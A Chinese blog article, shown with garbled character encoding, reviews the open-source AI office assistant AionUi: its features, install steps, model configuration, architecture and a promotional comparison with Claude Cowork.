<p>è¿™æ˜¯"ä¸€å¤©ä¸€ä¸ªå¼€æºé¡¹ç›®"ç³»åˆ—çš„ç¬¬7ç¯‡æ–‡ç« ã€‚ä»Šå¤©å¸¦ä½ äº†è§£çš„é¡¹ç›®æ˜¯ <strong>AionUi</strong>ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi" target="_blank" title="https://github.com/iOfficeAI/AionUi" ref="nofollow noopener noreferrer">GitHub</a>ï¼‰ã€‚</p>
<p>å¦‚æœä½ æ­£åœ¨å¯»æ‰¾ä¸€ä¸ªå…è´¹ã€å¼€æºã€è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹ï¼Œèƒ½å¤Ÿæ›¿ä»£Claude Coworkä½†åŠŸèƒ½æ›´å¼ºå¤§ï¼Œé‚£ä¹ˆAionUiç»å¯¹å€¼å¾—ä½ æ·±å…¥äº†è§£ã€‚å®ƒæ”¯æŒå¤šæ¨¡å‹ã€å¤šä¼šè¯ã€WebUIè¿œç¨‹è®¿é—®ï¼Œè¿˜èƒ½è¿›è¡Œæ–‡ä»¶ç®¡ç†ã€å®æ—¶é¢„è§ˆã€AIå›¾åƒç”Ÿæˆï¼Œæ˜¯ä¸€ä¸ªçœŸæ­£çš„"24/7 AIåŠå…¬ä¼™ä¼´"ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆé€‰æ‹©è¿™ä¸ªé¡¹ç›®ï¼Ÿ</strong></p>
<ul>
<li>ğŸ†“ <strong>å®Œå…¨å…è´¹å¼€æº</strong>ï¼šApache-2.0åè®®ï¼Œæ— è®¢é˜…è´¹ç”¨</li>
<li>ğŸŒ <strong>è·¨å¹³å°æ”¯æŒ</strong>ï¼šmacOSã€Windowsã€Linuxå…¨å¹³å°</li>
<li>ğŸ¤– <strong>å¤šæ¨¡å‹ç”Ÿæ€</strong>ï¼šæ”¯æŒGeminiã€Claudeã€OpenAIã€Qwenã€Ollamaç­‰</li>
<li>ğŸŒ <strong>WebUIè¿œç¨‹è®¿é—®</strong>ï¼š24/7éšæ—¶è®¿é—®ï¼Œæ”¯æŒç§»åŠ¨è®¾å¤‡</li>
<li>ğŸ“ <strong>æ™ºèƒ½æ–‡ä»¶ç®¡ç†</strong>ï¼šAIé©±åŠ¨çš„æ–‡ä»¶ç»„ç»‡å’Œå¤„ç†</li>
<li>ğŸ“„ <strong>å®æ—¶é¢„è§ˆ</strong>ï¼šæ”¯æŒ9+ç§æ ¼å¼çš„å³æ—¶é¢„è§ˆ</li>
<li>ğŸ¨ <strong>AIå›¾åƒç”Ÿæˆ</strong>ï¼šé›†æˆå¤šç§å›¾åƒç”Ÿæˆæ¨¡å‹</li>
</ul>
<h3 data-id="heading-1">ä½ å°†å­¦åˆ°ä»€ä¹ˆ</h3>
<ul>
<li>AionUiçš„æ ¸å¿ƒåŠŸèƒ½å’Œæ¶æ„è®¾è®¡</li>
<li>å¦‚ä½•é…ç½®å’Œä½¿ç”¨å¤šæ¨¡å‹AIåŠ©æ‰‹</li>
<li>WebUIè¿œç¨‹è®¿é—®çš„é…ç½®å’Œä½¿ç”¨</li>
<li>æ–‡ä»¶ç®¡ç†å’Œé¢„è§ˆåŠŸèƒ½çš„ä½¿ç”¨æŠ€å·§</li>
<li>AIå›¾åƒç”Ÿæˆå’Œç¼–è¾‘åŠŸèƒ½</li>
<li>ä¸Claude Coworkçš„å¯¹æ¯”åˆ†æ</li>
<li>å¦‚ä½•å¿«é€Ÿä¸Šæ‰‹ä½¿ç”¨AionUi</li>
</ul>
<h3 data-id="heading-2">å‰ç½®çŸ¥è¯†</h3>
<ul>
<li>å¯¹AIåŠ©æ‰‹æœ‰åŸºæœ¬äº†è§£</li>
<li>ç†Ÿæ‚‰æ¡Œé¢åº”ç”¨çš„ä½¿ç”¨</li>
<li>äº†è§£API Keyçš„é…ç½®ï¼ˆå¯é€‰ï¼‰</li>
<li>å¯¹æ–‡ä»¶ç®¡ç†æœ‰åŸºæœ¬æ¦‚å¿µ</li>
</ul>
<hr/>
<h2 data-id="heading-3">é¡¹ç›®èƒŒæ™¯</h2>
<h3 data-id="heading-4">é¡¹ç›®ç®€ä»‹</h3>
<p><strong>AionUi</strong> æ˜¯ä¸€ä¸ª<strong>å…è´¹ã€æœ¬åœ°ã€å¼€æºçš„24/7 AIåŠå…¬åŠ©æ‰‹</strong>ï¼Œæ”¯æŒGemini CLIã€Claude Codeã€Codexã€OpenCodeã€Qwen Codeã€Goose CLIã€Auggieç­‰å¤šç§AIä»£ç†ã€‚å®ƒæä¾›äº†å®Œæ•´çš„GUIç•Œé¢å’ŒWebUIè¿œç¨‹è®¿é—®ï¼Œè®©AIåŠ©æ‰‹çœŸæ­£æˆä¸ºä½ çš„"24å°æ—¶åŠå…¬ä¼™ä¼´"ã€‚</p>
<p><strong>é¡¹ç›®è§£å†³çš„æ ¸å¿ƒé—®é¢˜</strong>ï¼š</p>
<ul>
<li>Claude Coworkä»…æ”¯æŒmacOSï¼Œä¸”é”å®šClaudeæ¨¡å‹</li>
<li>ç¼ºä¹è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹è§£å†³æ–¹æ¡ˆ</li>
<li>éœ€è¦æ”¯æŒå¤šæ¨¡å‹çš„ç»Ÿä¸€ç•Œé¢</li>
<li>éœ€è¦æœ¬åœ°éƒ¨ç½²ï¼Œä¿æŠ¤æ•°æ®éšç§</li>
<li>éœ€è¦è¿œç¨‹è®¿é—®èƒ½åŠ›ï¼Œå®ç°24/7å¯ç”¨</li>
</ul>
<p><strong>é¢å‘çš„ç”¨æˆ·ç¾¤ä½“</strong>ï¼š</p>
<ul>
<li>éœ€è¦è·¨å¹³å°AIåŠ©æ‰‹çš„å¼€å‘è€…</li>
<li>å¸Œæœ›æ›¿ä»£Claude Coworkçš„ç”¨æˆ·</li>
<li>éœ€è¦å¤šæ¨¡å‹æ”¯æŒçš„AIç”¨æˆ·</li>
<li>å¯¹æ•°æ®éšç§æœ‰è¦æ±‚çš„ç”¨æˆ·</li>
<li>éœ€è¦è¿œç¨‹è®¿é—®AIå·¥å…·çš„ç”¨æˆ·</li>
</ul>
<h3 data-id="heading-5">ä½œè€…/å›¢é˜Ÿä»‹ç»</h3>
<p><strong>å›¢é˜Ÿï¼šiOfficeAI</strong></p>
<ul>
<li><strong>èƒŒæ™¯</strong>ï¼šä¸“æ³¨äºAIåŠå…¬è‡ªåŠ¨åŒ–çš„å¼€æºå›¢é˜Ÿ</li>
<li><strong>ç†å¿µ</strong>ï¼šæ‰“é€ å…è´¹ã€å¼€æºã€è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹</li>
<li><strong>é¡¹ç›®å®šä½</strong>ï¼šClaude Coworkçš„å¼€æºæ›¿ä»£æ–¹æ¡ˆ</li>
</ul>
<p><strong>é¡¹ç›®åˆ›å»ºæ—¶é—´</strong>ï¼š2024å¹´ï¼ˆä»GitHubæ´»åŠ¨æ¥çœ‹æ˜¯æŒç»­æ´»è·ƒçš„é¡¹ç›®ï¼‰</p>
<h3 data-id="heading-6">é¡¹ç›®æ•°æ®</h3>
<ul>
<li>â­ <strong>GitHub Stars</strong>: 11.7k+ï¼ˆæŒç»­å¿«é€Ÿå¢é•¿ï¼‰</li>
<li>ğŸ´ <strong>Forks</strong>: 884+</li>
<li>ğŸ“¦ <strong>ç‰ˆæœ¬</strong>: v1.7.8ï¼ˆæœ€æ–°ç‰ˆæœ¬ï¼Œ2026å¹´1æœˆ28æ—¥å‘å¸ƒï¼‰</li>
<li>ğŸ“„ <strong>License</strong>: Apache-2.0ï¼ˆå®Œå…¨å¼€æºï¼Œè‡ªç”±ä½¿ç”¨ï¼‰</li>
<li>ğŸŒ <strong>å®˜ç½‘</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aionui.com" target="_blank" title="https://www.aionui.com" ref="nofollow noopener noreferrer">www.aionui.com</a></li>
<li>ğŸ“š <strong>æ–‡æ¡£</strong>: åŒ…å«å®Œæ•´çš„ä½¿ç”¨æŒ‡å—å’Œé…ç½®æ–‡æ¡£</li>
<li>ğŸ’¬ <strong>ç¤¾åŒº</strong>: GitHub Issueså’ŒDiscussionsæ´»è·ƒ</li>
<li>ğŸ‘¥ <strong>è´¡çŒ®è€…</strong>: 31ä½è´¡çŒ®è€…ï¼Œæ´»è·ƒçš„ç¤¾åŒºå‚ä¸</li>
</ul>
<p><strong>é¡¹ç›®å‘å±•å†ç¨‹</strong>ï¼š</p>
<ul>
<li>2024å¹´ï¼šé¡¹ç›®åˆ›å»ºï¼Œå¼€å§‹æ„å»ºæ ¸å¿ƒåŠŸèƒ½</li>
<li>2024å¹´ä¸­ï¼šæ·»åŠ å¤šæ¨¡å‹æ”¯æŒå’ŒWebUIåŠŸèƒ½</li>
<li>2024å¹´åº•ï¼šå®Œå–„æ–‡ä»¶ç®¡ç†å’Œé¢„è§ˆåŠŸèƒ½</li>
<li>2025å¹´ï¼šæ·»åŠ AIå›¾åƒç”Ÿæˆå’Œç¼–è¾‘åŠŸèƒ½</li>
<li>2026å¹´ï¼šæŒç»­ä¼˜åŒ–ï¼Œç¤¾åŒºæ´»è·ƒåº¦æŒç»­æå‡</li>
</ul>
<hr/>
<h2 data-id="heading-7">ä¸»è¦åŠŸèƒ½</h2>
<h3 data-id="heading-8">æ ¸å¿ƒä½œç”¨</h3>
<p>AionUiçš„æ ¸å¿ƒä½œç”¨æ˜¯<strong>æä¾›ä¸€ä¸ªå…è´¹ã€å¼€æºã€è·¨å¹³å°çš„AIåŠå…¬åŠ©æ‰‹</strong>ï¼Œä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3c6bedaf8f84256893efd061ed4ff50~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Yas5aWHTGFi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770382563&amp;x-signature=rH6CvTezxRwIRv4MZm7qePaCGt0%3D" alt="07-01-aionui-function-banner.png" loading="lazy"/></p>
<ol>
<li><strong>å¤šæ¨¡å‹ç»Ÿä¸€ç®¡ç†</strong>ï¼šæ”¯æŒGeminiã€Claudeã€OpenAIã€Qwenã€Ollamaç­‰å¤šç§AIæ¨¡å‹ï¼Œç»Ÿä¸€ç®¡ç†å¯¹è¯å†å²</li>
<li><strong>è·¨å¹³å°ä½¿ç”¨</strong>ï¼šmacOSã€Windowsã€Linuxå…¨å¹³å°æ”¯æŒï¼Œæ”¯æŒWebUIè¿œç¨‹è®¿é—®</li>
<li><strong>æ–‡ä»¶æ™ºèƒ½ç®¡ç†</strong>ï¼šAIé©±åŠ¨çš„æ–‡ä»¶ç»„ç»‡ã€æ‰¹é‡å¤„ç†ã€Excelåˆ†æç­‰</li>
<li><strong>å®æ—¶é¢„è§ˆ</strong>ï¼šæ”¯æŒPDFã€Wordã€Excelã€PPTã€ä»£ç ã€Markdownç­‰9+ç§æ ¼å¼çš„å³æ—¶é¢„è§ˆå’Œç¼–è¾‘</li>
<li><strong>AIå›¾åƒç”Ÿæˆ</strong>ï¼šé›†æˆGemini 2.5 Flashã€Nanoã€Bananaç­‰å¤šç§å›¾åƒç”Ÿæˆæ¨¡å‹</li>
</ol>
<h3 data-id="heading-9">å¿«é€Ÿå¼€å§‹</h3>
<h4 data-id="heading-10">å®‰è£…æ–¹å¼</h4>
<p>AionUiæ”¯æŒå¤šç§å®‰è£…æ–¹å¼ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ–¹å¼1ï¼šä»GitHub Releasesä¸‹è½½ï¼ˆæ¨èï¼‰</span>
<span class="hljs-comment"># è®¿é—® https://github.com/iOfficeAI/AionUi/releases</span>
<span class="hljs-comment"># ä¸‹è½½å¯¹åº”å¹³å°çš„å®‰è£…åŒ…</span>

<span class="hljs-comment"># macOS</span>
<span class="hljs-comment"># ä¸‹è½½ .dmg æ–‡ä»¶å¹¶å®‰è£…</span>

<span class="hljs-comment"># Windows</span>
<span class="hljs-comment"># ä¸‹è½½ .exe æ–‡ä»¶å¹¶å®‰è£…</span>

<span class="hljs-comment"># Linux</span>
<span class="hljs-comment"># ä¸‹è½½ .AppImage æˆ– .deb/.rpm æ–‡ä»¶å¹¶å®‰è£…</span>

<span class="hljs-comment"># æ–¹å¼2ï¼šä»æºç æ„å»º</span>
git <span class="hljs-built_in">clone</span> https://github.com/iOfficeAI/AionUi.git
<span class="hljs-built_in">cd</span> AionUi
npm install
npm run build
</code></pre>
<h4 data-id="heading-11">åŸºæœ¬é…ç½®</h4>
<p><strong>1. é¦–æ¬¡å¯åŠ¨é…ç½®</strong></p>
<p>å¯åŠ¨AionUiåï¼Œé¦–æ¬¡ä½¿ç”¨éœ€è¦é…ç½®AIæœåŠ¡ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># æ”¯æŒGoogleè´¦å·ç™»å½•ï¼ˆè‡ªåŠ¨å…³è”Gemini CLIï¼‰</span>
<span class="hljs-comment"># æˆ–ä½¿ç”¨API Keyé…ç½®</span>

<span class="hljs-comment"># Geminié…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"gemini"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_GEMINI_API_KEY"</span>

<span class="hljs-comment"># Claudeé…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"anthropic"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_CLAUDE_API_KEY"</span>

<span class="hljs-comment"># OpenAIé…ç½®ç¤ºä¾‹</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"openai"</span>
<span class="hljs-attr">apiKey:</span> <span class="hljs-string">"YOUR_OPENAI_API_KEY"</span>

<span class="hljs-comment"># æœ¬åœ°æ¨¡å‹é…ç½®ï¼ˆOllamaï¼‰</span>
<span class="hljs-attr">provider:</span> <span class="hljs-string">"custom"</span>
<span class="hljs-attr">apiUrl:</span> <span class="hljs-string">"http://localhost:11434/v1"</span>
</code></pre>
<p><strong>2. æœ€ç®€å•çš„ä½¿ç”¨ç¤ºä¾‹</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. å¯åŠ¨AionUiåº”ç”¨</span>
<span class="hljs-comment"># 2. é€‰æ‹©AIæ¨¡å‹ï¼ˆå¦‚Gemini CLIï¼‰</span>
<span class="hljs-comment"># 3. å¼€å§‹å¯¹è¯</span>

ç”¨æˆ·ï¼š<span class="hljs-string">"å¸®æˆ‘æ•´ç†ä¸€ä¸‹æ¡Œé¢ä¸Šçš„æ–‡ä»¶"</span>
AIï¼š<span class="hljs-string">"æˆ‘æ¥å¸®ä½ æ•´ç†æ–‡ä»¶ã€‚è¯·å‘Šè¯‰æˆ‘ä½ çš„æ•´ç†åå¥½..."</span>

ç”¨æˆ·ï¼š<span class="hljs-string">"ç”Ÿæˆä¸€ä¸ªReactç»„ä»¶çš„ä»£ç "</span>
AIï¼š<span class="hljs-string">"æˆ‘æ¥ä¸ºä½ ç”Ÿæˆä¸€ä¸ªReactç»„ä»¶..."</span>
</code></pre>
<h3 data-id="heading-12">æ ¸å¿ƒç‰¹æ€§</h3>
<ul>
<li><strong>å¤šä¼šè¯ç®¡ç†</strong>ï¼šæ”¯æŒå¤šä¼šè¯å¹¶å‘ï¼Œæ¯ä¸ªä¼šè¯ç‹¬ç«‹ä¸Šä¸‹æ–‡ï¼Œæœ¬åœ°SQLiteå­˜å‚¨</li>
<li><strong>WebUIè¿œç¨‹è®¿é—®</strong>ï¼šæµè§ˆå™¨è®¿é—®ï¼Œæ”¯æŒç§»åŠ¨è®¾å¤‡ï¼Œ24/7å¯ç”¨ï¼Œæ”¯æŒSSHéš§é“</li>
<li><strong>å¤šæ¨¡å‹ç”Ÿæ€</strong>ï¼šä¸»æµæ¨¡å‹ï¼ˆGeminiã€OpenAIã€Claudeã€Qwenï¼‰+ æœ¬åœ°æ¨¡å‹ï¼ˆOllamaã€LM Studioï¼‰+ è‡ªå®šä¹‰å¹³å°</li>
<li><strong>æ™ºèƒ½æ–‡ä»¶ç®¡ç†</strong>ï¼šæ–‡ä»¶æ ‘æµè§ˆã€æ‹–æ‹½ä¸Šä¼ ã€AIæ™ºèƒ½ç»„ç»‡ã€æ‰¹é‡å¤„ç†</li>
<li><strong>å®æ—¶é¢„è§ˆç¼–è¾‘</strong>ï¼š9+æ ¼å¼æ”¯æŒï¼Œå®æ—¶è·Ÿè¸ªæ–‡ä»¶å˜åŒ–ï¼Œæ”¯æŒMarkdown/ä»£ç /HTMLç¼–è¾‘</li>
<li><strong>AIå›¾åƒç”Ÿæˆ</strong>ï¼šé›†æˆå¤šç§å›¾åƒç”Ÿæˆæ¨¡å‹ï¼Œæ”¯æŒå›¾åƒè¯†åˆ«å’Œç¼–è¾‘</li>
<li><strong>ç•Œé¢å®šåˆ¶</strong>ï¼šCSSè‡ªå®šä¹‰ç•Œé¢ï¼Œè‡ªç”±å®šåˆ¶é¢œè‰²ã€æ ·å¼ã€å¸ƒå±€</li>
<li><strong>æ•°æ®å®‰å…¨</strong>ï¼šå®Œå…¨æœ¬åœ°å­˜å‚¨ï¼Œæ•°æ®ä¸ä¸Šäº‘ï¼Œç”¨æˆ·å®Œå…¨æ§åˆ¶</li>
</ul>
<h3 data-id="heading-13">é¡¹ç›®ä¼˜åŠ¿</h3>

































































<table><thead><tr><th align="left">å¯¹æ¯”é¡¹</th><th align="left">AionUi</th><th align="left">Claude Cowork</th><th align="left">å…¶ä»–AIåŠ©æ‰‹</th></tr></thead><tbody><tr><td align="left"><strong>å¹³å°æ”¯æŒ</strong></td><td align="left">macOS / Windows / Linux</td><td align="left">macOS Only</td><td align="left">éƒ¨åˆ†è·¨å¹³å°</td></tr><tr><td align="left"><strong>æ¨¡å‹æ”¯æŒ</strong></td><td align="left">å¤šæ¨¡å‹ï¼ˆGeminiã€Claudeã€OpenAIç­‰ï¼‰</td><td align="left">Claude Only</td><td align="left">å•ä¸€æ¨¡å‹</td></tr><tr><td align="left"><strong>è®¿é—®æ–¹å¼</strong></td><td align="left">GUI + WebUIè¿œç¨‹è®¿é—®</td><td align="left">GUI Only</td><td align="left">GUIä¸ºä¸»</td></tr><tr><td align="left"><strong>æˆæœ¬</strong></td><td align="left">å®Œå…¨å…è´¹å¼€æº</td><td align="left">$100/æœˆè®¢é˜…</td><td align="left">éƒ¨åˆ†å…è´¹</td></tr><tr><td align="left"><strong>æ•°æ®éšç§</strong></td><td align="left">å®Œå…¨æœ¬åœ°å­˜å‚¨</td><td align="left">äº‘ç«¯å­˜å‚¨</td><td align="left">æ··åˆå­˜å‚¨</td></tr><tr><td align="left"><strong>æ–‡ä»¶ç®¡ç†</strong></td><td align="left">AIæ™ºèƒ½ç®¡ç†</td><td align="left">åŸºç¡€æ”¯æŒ</td><td align="left">æœ‰é™æ”¯æŒ</td></tr><tr><td align="left"><strong>é¢„è§ˆåŠŸèƒ½</strong></td><td align="left">9+æ ¼å¼å®æ—¶é¢„è§ˆ</td><td align="left">æœ‰é™é¢„è§ˆ</td><td align="left">åŸºç¡€é¢„è§ˆ</td></tr><tr><td align="left"><strong>å›¾åƒç”Ÿæˆ</strong></td><td align="left">å¤šæ¨¡å‹æ”¯æŒ</td><td align="left">æ— </td><td align="left">éƒ¨åˆ†æ”¯æŒ</td></tr><tr><td align="left"><strong>å®šåˆ¶èƒ½åŠ›</strong></td><td align="left">CSSè‡ªå®šä¹‰ç•Œé¢</td><td align="left">æœ‰é™å®šåˆ¶</td><td align="left">æœ‰é™å®šåˆ¶</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆé€‰æ‹©AionUiï¼Ÿ</strong></p>
<p>ç›¸æ¯”Claude Coworkï¼ŒAionUiæä¾›è·¨å¹³å°æ”¯æŒã€å¤šæ¨¡å‹ç”Ÿæ€ã€WebUIè¿œç¨‹è®¿é—®ã€å®Œå…¨å…è´¹å¼€æºï¼Œæ˜¯æ›´å¼ºå¤§çš„æ›¿ä»£æ–¹æ¡ˆã€‚</p>
<hr/>
<h2 data-id="heading-14">é¡¹ç›®è¯¦ç»†å‰–æ</h2>
<h3 data-id="heading-15">æ¶æ„è®¾è®¡</h3>
<p>AionUié‡‡ç”¨<strong>Electron + React + TypeScript</strong>çš„ç°ä»£æ¡Œé¢åº”ç”¨æ¶æ„ï¼Œä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒæ¨¡å—ï¼š</p>
<h4 data-id="heading-16">æ ¸å¿ƒæ¶æ„</h4>
<pre><code class="hljs language-java" lang="java">AionUi Application
â”œâ”€â”€ Main <span class="hljs-title function_">Process</span> <span class="hljs-params">(Electron)</span>
â”‚   â”œâ”€â”€ çª—å£ç®¡ç†
â”‚   â”œâ”€â”€ ç³»ç»Ÿé›†æˆ
â”‚   â”œâ”€â”€ æ–‡ä»¶ç³»ç»Ÿè®¿é—®
â”‚   â””â”€â”€ æœ¬åœ°æ•°æ®åº“ç®¡ç†
â”œâ”€â”€ Renderer <span class="hljs-title function_">Process</span> <span class="hljs-params">(React)</span>
â”‚   â”œâ”€â”€ UIç»„ä»¶å±‚
â”‚   â”œâ”€â”€ çŠ¶æ€ç®¡ç†
â”‚   â”œâ”€â”€ APIè°ƒç”¨å±‚
â”‚   â””â”€â”€ æ–‡ä»¶é¢„è§ˆç»„ä»¶
â”œâ”€â”€ AIæœåŠ¡å±‚
â”‚   â”œâ”€â”€ å¤šæ¨¡å‹é€‚é…å™¨
â”‚   â”œâ”€â”€ APIè°ƒç”¨å°è£…
â”‚   â”œâ”€â”€ æµå¼å“åº”å¤„ç†
â”‚   â””â”€â”€ ä¸Šä¸‹æ–‡ç®¡ç†
â””â”€â”€ æ•°æ®å±‚
    â”œâ”€â”€ SQLiteæ•°æ®åº“ï¼ˆå¯¹è¯å†å²ï¼‰
    â”œâ”€â”€ æœ¬åœ°æ–‡ä»¶å­˜å‚¨
    â””â”€â”€ é…ç½®ç®¡ç†
</code></pre>
<h4 data-id="heading-17">å¤šæ¨¡å‹é€‚é…æ¶æ„</h4>
<p>AionUié€šè¿‡ç»Ÿä¸€çš„é€‚é…å™¨æ¨¡å¼æ”¯æŒå¤šç§AIæ¨¡å‹ï¼Œæ¯ä¸ªæ¨¡å‹ï¼ˆGeminiã€Claudeã€OpenAIç­‰ï¼‰éƒ½æœ‰ç‹¬ç«‹çš„é€‚é…å™¨å®ç°ï¼Œé€šè¿‡ç»Ÿä¸€çš„<code>AIModelAdapter</code>æ¥å£ç®¡ç†ã€‚è¿™ç§è®¾è®¡ä½¿å¾—æ·»åŠ æ–°æ¨¡å‹å˜å¾—ç®€å•ï¼Œå„æ¨¡å‹å®ç°ç‹¬ç«‹ï¼Œæ”¯æŒåŠ¨æ€åŠ è½½å’Œé…ç½®ã€‚</p>
<h4 data-id="heading-18">WebUIè¿œç¨‹è®¿é—®æ¶æ„</h4>
<p>AionUiçš„WebUIé€šè¿‡å†…ç½®ExpressæœåŠ¡å™¨å’ŒWebSocketå®ç°ï¼Œæä¾›é™æ€æ–‡ä»¶æœåŠ¡ã€APIè·¯ç”±ï¼ˆèŠå¤©ã€ä¼šè¯ã€æ¨¡å‹ç®¡ç†ï¼‰å’Œå®æ—¶é€šä¿¡ã€‚æ”¯æŒTokenè®¤è¯ã€HTTPSã€IPç™½åå•å’ŒSSHéš§é“ç­‰å®‰å…¨æœºåˆ¶ã€‚</p>
<h3 data-id="heading-19">æ–‡ä»¶ç®¡ç†ç³»ç»Ÿ</h3>
<p>AionUiçš„æ–‡ä»¶ç®¡ç†ç³»ç»Ÿæ”¯æŒæ–‡ä»¶æ ‘æµè§ˆã€æ‹–æ‹½ä¸Šä¼ å’ŒAIé©±åŠ¨çš„æ™ºèƒ½ç»„ç»‡ã€‚é€šè¿‡<code>FileTreeManager</code>æ‰«ææ–‡ä»¶ç³»ç»Ÿï¼Œä½¿ç”¨AIåˆ†ææ–‡ä»¶å¹¶æ‰§è¡Œç»„ç»‡æ“ä½œã€‚æ”¯æŒæ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„é€’å½’å¤„ç†ã€‚</p>
<h3 data-id="heading-20">é¢„è§ˆé¢æ¿ç³»ç»Ÿ</h3>
<p>AionUiçš„é¢„è§ˆé¢æ¿é€šè¿‡<code>PreviewComponent</code>æ¥å£å®ç°æ’ä»¶åŒ–æ¶æ„ï¼Œæ”¯æŒPDFã€Wordã€Excelã€PPTã€ä»£ç ã€Markdownã€HTMLã€å›¾åƒã€JSON/YAML/CSVç­‰9+ç§æ ¼å¼ã€‚æ¯ä¸ªé¢„è§ˆç»„ä»¶å®ç°<code>canPreview</code>ã€<code>render</code>ã€<code>update</code>æ–¹æ³•ï¼Œ<code>PreviewManager</code>è´Ÿè´£ç®¡ç†å’Œè·¯ç”±ã€‚æ”¯æŒå®æ—¶æ–‡ä»¶ç›‘å¬å’Œç¼–è¾‘ã€‚</p>
<h3 data-id="heading-21">å¤šä¼šè¯ç®¡ç†ç³»ç»Ÿ</h3>
<p>AionUiçš„<code>ConversationManager</code>ç®¡ç†å¤šä¸ªå¹¶å‘ä¼šè¯ï¼Œæ¯ä¸ªä¼šè¯åŒ…å«ç‹¬ç«‹çš„å¯¹è¯å†å²ã€æ¨¡å‹é…ç½®å’Œå…ƒæ•°æ®ã€‚æ”¯æŒè‡ªåŠ¨æ ‡é¢˜ç”Ÿæˆã€æ™ºèƒ½ä¸Šä¸‹æ–‡æˆªå–ï¼ˆåŸºäºTokené™åˆ¶ï¼‰ã€SQLiteæœ¬åœ°æŒä¹…åŒ–å’Œå¿«é€Ÿåˆ‡æ¢ã€‚</p>
<h3 data-id="heading-22">AIå›¾åƒç”Ÿæˆç³»ç»Ÿ</h3>
<p>AionUié€šè¿‡<code>ImageGenerator</code>æ¥å£å®ç°æ’ä»¶åŒ–çš„å›¾åƒç”Ÿæˆæ¶æ„ï¼Œæ”¯æŒGemini 2.5 Flash Image Previewã€Nanoã€Bananaç­‰å¤šç§æ¨¡å‹ã€‚<code>ImageGenerationManager</code>ç»Ÿä¸€ç®¡ç†æ‰€æœ‰ç”Ÿæˆå™¨ï¼Œæ”¯æŒå•ä¸ªå’Œæ‰¹é‡ç”Ÿæˆã€‚</p>
<h3 data-id="heading-23">æœ¬åœ°æ•°æ®å®‰å…¨</h3>
<p>AionUiä½¿ç”¨SQLiteæ•°æ®åº“å­˜å‚¨æ‰€æœ‰æ•°æ®ï¼ˆå¯¹è¯å†å²ã€æ–‡ä»¶å…ƒæ•°æ®ã€è®¾ç½®ï¼‰ï¼Œæ•°æ®å®Œå…¨å­˜å‚¨åœ¨ç”¨æˆ·æ•°æ®ç›®å½•ï¼Œä¸ä¼šä¸Šä¼ åˆ°ä»»ä½•æœåŠ¡å™¨ã€‚æ”¯æŒå¯é€‰çš„æ•°æ®åŠ å¯†å’Œæ•°æ®å¯¼å‡ºåŠŸèƒ½ï¼Œç”¨æˆ·å®Œå…¨æ§åˆ¶è‡ªå·±çš„æ•°æ®ã€‚</p>
<hr/>
<h2 data-id="heading-24">é¡¹ç›®åœ°å€ä¸èµ„æº</h2>
<h3 data-id="heading-25">å®˜æ–¹èµ„æº</h3>
<ul>
<li>ğŸŒŸ <strong>GitHub</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi" target="_blank" title="https://github.com/iOfficeAI/AionUi" ref="nofollow noopener noreferrer">github.com/iOfficeAI/Aâ€¦</a></li>
<li>ğŸ“š <strong>æ–‡æ¡£</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi%2Fwiki" target="_blank" title="https://github.com/iOfficeAI/AionUi/wiki" ref="nofollow noopener noreferrer">GitHub Wiki</a></li>
<li>ğŸ’¬ <strong>ç¤¾åŒº</strong>: GitHub Discussions</li>
<li>ğŸ› <strong>Issue Tracker</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FiOfficeAI%2FAionUi%2Fissues" target="_blank" title="https://github.com/iOfficeAI/AionUi/issues" ref="nofollow noopener noreferrer">GitHub Issues</a></li>
<li>ğŸ“¦ <strong>æœ€æ–°ç‰ˆæœ¬</strong>: v1.7.8ï¼ˆ2026å¹´1æœˆ28æ—¥å‘å¸ƒï¼‰</li>
</ul>
<h3 data-id="heading-26">é€‚ç”¨äººç¾¤</h3>
<p><strong>AionUiç‰¹åˆ«é€‚åˆ</strong>ï¼šéœ€è¦è·¨å¹³å°AIåŠ©æ‰‹çš„å¼€å‘è€…ã€å¤šæ¨¡å‹ç”¨æˆ·ã€å¯¹æ•°æ®éšç§æœ‰è¦æ±‚çš„ç”¨æˆ·ã€éœ€è¦åŠå…¬è‡ªåŠ¨åŒ–åŠŸèƒ½çš„ç”¨æˆ·ï¼Œä»¥åŠå¸Œæœ›æ›¿ä»£Claude Coworkçš„å…è´¹å¼€æºæ–¹æ¡ˆçš„ç”¨æˆ·ã€‚</p>
<p><strong>ä¸é€‚åˆ</strong>ï¼šåªéœ€è¦ç®€å•èŠå¤©çš„ç”¨æˆ·ã€ä¸éœ€è¦è·¨å¹³å°çš„macOSç”¨æˆ·ã€ä¸éœ€è¦å¤šæ¨¡å‹æ”¯æŒçš„ç”¨æˆ·ã€‚</p>
<hr/>
